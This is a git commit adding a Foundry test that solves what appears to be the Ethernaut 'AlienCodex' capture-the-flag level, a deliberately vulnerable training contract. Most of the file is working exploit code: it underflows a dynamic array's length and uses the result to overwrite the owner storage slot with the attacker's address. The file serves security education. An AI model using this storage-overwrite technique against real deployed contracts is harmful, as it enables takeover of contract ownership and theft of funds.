8d38859f519ede42327bf5dc02f26ae679d82039
beaverx00 <beaverx00@gmail.com>
2023-04-11 01:29:21 +0900

    add AlienCodex test

---
+++ test/AlienCodex.t.sol
@@ -0,0 +1,67 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+interface IAlienCodex {
+    function owner() external view returns (address);
+
+    function make_contact() external;
+
+    function retract() external;
+
+    function revise(uint256, bytes32) external;
+}
+
+contract AlienCodexTest is Test {
+    address player;
+
+    function setUp() public {
+        player = makeAddr("PLAYER");
+    }
+
+    function test_AlienCodex() public {
+        // ----------------------------------
+        // Create level instance
+        // ----------------------------------
+
+        // AlienCodex contract cannot compile at higher than solidity 0.5
+        bytes memory bytecode = abi.encodePacked(
+            vm.getCode("../src/levels:AlienCodex")
+        );
+        address target;
+        assembly {
+            target := create(0, add(bytecode, 0x20), mload(bytecode))
+        }
+        vm.label(target, "AlienCodex");
+
+        // ----------------------------------
+        // Initiate attack
+        // ----------------------------------
+        vm.startPrank(player);
+
+        IAlienCodex(target).make_contact();
+        /*
+         Arithmetic underflow occurs, codex.length becomes (2**256 - 1)
+
+         From solidity 0.6, access to length of array is read-only
+         It is no longer possible to assign a new value to their length
+
+         From solidity 0.8, arithmetic opertaions revert on undeflow/overflow
+         */
+        IAlienCodex(target).retract();
+
+        //
+        uint256 index = type(uint256).max -
+            uint256(keccak256(abi.encodePacked(uint256(1)))) +
+            1;
+        IAlienCodex(target).revise(index, bytes32(uint256(uint160(player))));
+        IAlienCodex(target).owner();
+        vm.stopPrank();
+
+        // ----------------------------------
+        // Validate
+        // ----------------------------------
+        assertEq(IAlienCodex(target).owner(), player);
+    }
+}
